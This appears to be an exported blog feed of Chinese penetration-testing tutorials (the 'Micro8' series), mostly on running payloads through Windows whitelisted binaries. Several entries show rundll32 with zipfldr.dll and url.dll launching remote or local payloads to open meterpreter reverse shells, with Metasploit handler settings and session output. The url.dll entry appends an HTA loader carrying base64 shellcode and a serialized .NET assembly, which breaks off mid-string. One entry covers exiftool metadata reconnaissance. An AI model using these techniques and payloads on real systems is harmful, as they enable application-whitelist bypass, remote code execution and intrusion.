C:\Windows\system32\conhost.exe</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><img src="../do/media/92b08ed12094b305ffb3f0979797c9f3.jpg" alt></p><h3 id="靶机："><a href="#靶机：" class="headerlink" title="靶机："></a>靶机：</h3><p><img src="../do/media/7db4df2368b755bc5c4497c0064a98f9.jpg" alt></p><h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><p>Micropoor_shellcode for payload backdoor</p><p><a href="https://micropoor.blogspot.com/2019/01/micropoorshellcode-for-payload-backdoor.html" target="_blank" rel="noopener">https://micropoor.blogspot.com/2019/01/micropoorshellcode-for-payload-backdoor.html</a></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>91、从目标文件中做信息搜集第一季</title>
      <link href="/article/91_%E4%BB%8E%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E4%B8%AD%E5%81%9A%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%AC%AC%E4%B8%80%E5%AD%A3.html"/>
      <url>/article/91_%E4%BB%8E%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E4%B8%AD%E5%81%9A%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%AC%AC%E4%B8%80%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<h3 id="Exiftool简介："><a href="#Exiftool简介：" class="headerlink" title="Exiftool简介："></a>Exiftool简介：</h3><p>ExifTool可读写及处理图像、视频及音频，例如Exif、IPTC、XMP、JFIF、GeoTIFF、ICC Profile。包括许多相机的制造商信息读取，如佳能，卡西欧，大疆，FLIR，三星等。</p><p>同样它支持多国语言<br><img src="../do/media/8c211b7e474044d2fa7724cbc822d65e.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@John:tmp# exiftool ‐lang zh‐cn ‐a ‐u ‐g1 ./55e736d12f2eb9385716e513d8628535e4dd6fdc.jpg</span><br><span class="line">‐‐‐‐ ExifTool ‐‐‐‐</span><br><span class="line">ExifTool 版本 : 11.16</span><br><span class="line">‐‐‐‐ System ‐‐‐‐</span><br><span class="line">文件名 : 55e736d12f2eb9385716e513d8628535e4dd6fdc.jpg</span><br><span class="line">文件存储位置 : .</span><br><span class="line">文件大小 : 84 kB</span><br><span class="line">更新日期 : 2019:01:20 20:07:57‐05:00</span><br><span class="line">File Access Date/Time : 2019:01:21 08:00:14‐05:00</span><br><span class="line">File Inode Change Date/Time : 2019:01:21 07:59:58‐05:00</span><br><span class="line">File Permissions : rw‐r‐‐r‐‐</span><br><span class="line">‐‐‐‐ File ‐‐‐‐</span><br><span class="line">文件格式 : JPEG</span><br><span class="line">File Type Extension : jpg</span><br><span class="line">MIME Type : image/jpeg</span><br><span class="line">像宽 : 580</span><br><span class="line">像高 : 773</span><br><span class="line">Encoding Process : Baseline DCT, Huffman coding</span><br><span class="line">每个组件的比特数 : 8</span><br><span class="line">Color Components : 3</span><br><span class="line">YCC 像素结构(Y 至 C 的子采样率) : YCbCr4:2:0 (2 2)</span><br><span class="line">‐‐‐‐ JFIF ‐‐‐‐</span><br><span class="line">JFIF 版本 : 1.01</span><br><span class="line">图像高宽分辨率单位 : 英寸</span><br><span class="line">X Resolution : 1</span><br><span class="line">Y Resolution : 1</span><br><span class="line">‐‐‐‐ Composite ‐‐‐‐</span><br><span class="line">图像尺寸 : 580x773</span><br><span class="line">Megapixels : 0.448 30</span><br></pre></td></tr></table></figure><p><img src="../do/media/44730127c9b9a54788b751762cdc7fd8.jpg" alt></p><p>在大型内网渗透中，尤其是针对办公机的渗透，需要熟知目标集体或者个人的作息时间，工作时间，文档时间，咖啡时间，或者需要从某些文件中获取对方的真实拍摄地坐标等。那么无疑需要快速的从大量文件中筛选信息诉求。当目标越复杂，文件中的信息搜集就更为重要。如文档作者，技术文章作者，财务文档作者等，熟知在大量人员，获取对方职务，大大减少渗透过程中的无用性，重复性，可见性。与暴露性。而作为公司，应该熟悉相关文档的内置属性，尤其是在共享文件服务器上，删除或者复写敏感信息来降低企业安全风险。本篇意旨企业安全在处理本公司相关敏感文件以及重要文件应做好更多的防范，尤其是重要部门，如研发，财务等。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>90、基于白名单zipfldr.dll执行payload第十八季</title>
      <link href="/article/90_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95zipfldr.dll%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%85%AB%E5%AD%A3.html"/>
      <url>/article/90_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95zipfldr.dll%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%85%AB%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><h3 id="zipfldr-dll简介："><a href="#zipfldr-dll简介：" class="headerlink" title="zipfldr.dll简介："></a>zipfldr.dll简介：</h3><p>zipfldr.dll自Windows xp开始自带的zip文件压缩/解压工具组件。</p><p><strong>说明：</strong>zipfldr.dll所在路径已被系统添加PATH环境变量中，因此，zipfldr.dll命令可识别，但由于为dll文件，需调用rundll32.exe来执行。</p><p>Windows 2003 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\zipfldr.dll</span><br><span class="line">C:\Windows\SysWOW64\zipfldr.dll</span><br></pre></td></tr></table></figure><p>Windows 7 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\zipfldr.dll</span><br><span class="line">C:\Windows\SysWOW64\zipfldr.dll</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong><br>192.168.1.4 Debian<br><strong>靶机：</strong><br>192.168.1.3 Windows 7<br>192.168.1.3 Windows 2003</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.4 yes The listen address (an interface may be specified)</span><br><span class="line"></span><br><span class="line">LPORT 53 yes The listen port </span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Wildcard Target </span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br></pre></td></tr></table></figure><p><img src="../do/media/9fef673f4302344108c99ae65736192b.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe zipfldr.dll,RouteTheCall \\192.168.1.119\share\rev_x86_53_exe.exe</span><br></pre></td></tr></table></figure><p><img src="../do/media/7897dfacc157ca226256c698c2c468a0.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.3</span><br><span class="line">[*] Meterpreter session 7 opened (192.168.1.4:53 ‐&gt; 192.168.1.3:5245) at</span><br><span class="line">2019‐01‐21 04:55:44 ‐0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: John‐PC\John</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 6988</span><br></pre></td></tr></table></figure><p><img src="../do/media/c702b7cef88aa93a5dadb129d20b4917.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>89、基于白名单Url.dll执行payload第十七季</title>
      <link href="/article/89_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Url.dll%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B8%83%E5%AD%A3.html"/>
      <url>/article/89_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Url.dll%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B8%83%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><h3 id="Url-dll简介："><a href="#Url-dll简介：" class="headerlink" title="Url.dll简介："></a>Url.dll简介：</h3><p>url.dll是Internet快捷壳扩展相关应用程序接口系统文件。</p><p><strong>说明：</strong>url.dll所在路径已被系统添加PATH环境变量中，因此，url.dll命令可识别，但由于为dll文件，需调用rundll32.exe来执行。</p><p>Windows 2003 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\url.dll</span><br><span class="line">C:\Windows\SysWOW64\url.dll</span><br></pre></td></tr></table></figure><p>Windows 7 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\url.dll</span><br><span class="line">C:\Windows\SysWOW64\url.dll</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong> 192.168.1.4 Debian<br><strong>靶机：</strong> 192.168.1.3 Windows 7</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.4 yes The listen address (an interface may be specified)</span><br><span class="line"></span><br><span class="line">LPORT 53 yes The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Wildcard Target</span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br></pre></td></tr></table></figure><p><img src="../do/media/34dcce4115809e6e8606cd1ef8322301.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe url.dll,FileProtocolHandler file://C:\Users\John\Desktop\Micropoor_url_dll.hta</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.3</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.1.4:53 ‐&gt; 192.168.1.3:5018) at</span><br><span class="line">2019‐01‐21 04:41:43 ‐0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: John‐PC\John</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 8584</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">![](../do/media/35593539e0127b86c28eef1e16e5f52b.jpg)</span><br><span class="line"></span><br><span class="line">同样可以调用url.dll下载payload：</span><br><span class="line"></span><br><span class="line">```code</span><br><span class="line">rundll32.exe url.dll,OpenURL http://192.168.1.4/Micropoor_url_dll.hta</span><br></pre></td></tr></table></figure><h3 id="附录：Micropoor-url-dll-hta"><a href="#附录：Micropoor-url-dll-hta" class="headerlink" title="附录：Micropoor_url_dll.hta"></a>附录：Micropoor_url_dll.hta</h3><figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line"></span><br><span class="line">Dim binary : binary = &quot;rundll32.exe&quot;</span><br><span class="line"></span><br><span class="line">Dim code : code = &quot;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMH</span><br><span class="line">PDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7</span><br><span class="line">fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfV</span><br><span class="line">GhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D/1Z</span><br><span class="line">dqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmo</span><br><span class="line">AaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8M</span><br><span class="line">JA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U=&quot;</span><br><span class="line"></span><br><span class="line">Sub Debug(s)</span><br><span class="line">End Sub</span><br><span class="line">Sub SetVersion</span><br><span class="line">End Sub</span><br><span class="line">Function Base64ToStream(b)</span><br><span class="line">Dim enc, length, ba, transform, ms</span><br><span class="line">Set enc = CreateObject(&quot;System.Text.ASCIIEncoding&quot;)</span><br><span class="line">length = enc.GetByteCount_2(b)</span><br><span class="line">Set transform = CreateObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;)</span><br><span class="line">Set ms = CreateObject(&quot;System.IO.MemoryStream&quot;)</span><br><span class="line">ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)</span><br><span class="line">ms.Position = 0</span><br><span class="line">Set Base64ToStream = ms</span><br><span class="line">End Function</span><br><span class="line">Sub Run</span><br><span class="line"></span><br><span class="line">Dim s, entry_class</span><br><span class="line"></span><br><span class="line">s = &quot;AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;</span><br><span class="line">s = s &amp; &quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;</span><br><span class="line">s = s &amp; &quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;</span><br><span class="line">s = s &amp; &quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;</span><br><span class="line">s = s &amp; &quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;</span><br><span class="line">s = s &amp; &quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;</span><br><span class="line">s = s &amp; &quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;</span><br><span class="line">s = s &amp; &quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;</span><br><span class="line">s = s &amp; &quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;</span><br><span class="line">s = s &amp; &quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;</span><br><span class="line">s = s &amp; &quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;</span><br><span class="line">s = s &amp; &quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;</span><br><span class="line">s = s &amp; &quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;</span><br><span class="line">s = s &amp; &quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;</span><br><span class="line">s = s &amp; &quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;</span><br><span class="line">s = s &amp; &quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;</span><br><span class="line">s = s &amp; &quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;</span><br><span class="line">s = s &amp; &quot;AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA&quot;</span><br><span class="line">s = s &amp; &quot;AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y&quot;</span><br><span class="line">s = s &amp; &quot;bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh&quot;</span><br><span class="line">s = s &amp; &quot;NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz&quot;</span><br><span class="line">s = s &amp; &quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAAB4AAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;</span><br><span class="line">s = s &amp; &quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAkNhXWQAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAA4AAiIAsBMAAAFgAAAAYAAAAAAAByNQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAIDUA&quot;</span><br><span class="line">s = s &amp; &quot;AE8AAAAAQAAAkAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAALnRleHQAAAB4FQAAACAAAAAWAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAkAMAAABA&quot;</span><br><span class="line">s = s &amp; &quot;AAAABAAAABgAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAcAAAAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; &quot;AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAFQ1AAAAAAAASAAAAAIABQD4IQAAKBMAAAEAAAAAAAAA&quot;</span><br><span class="line">s = s &amp; 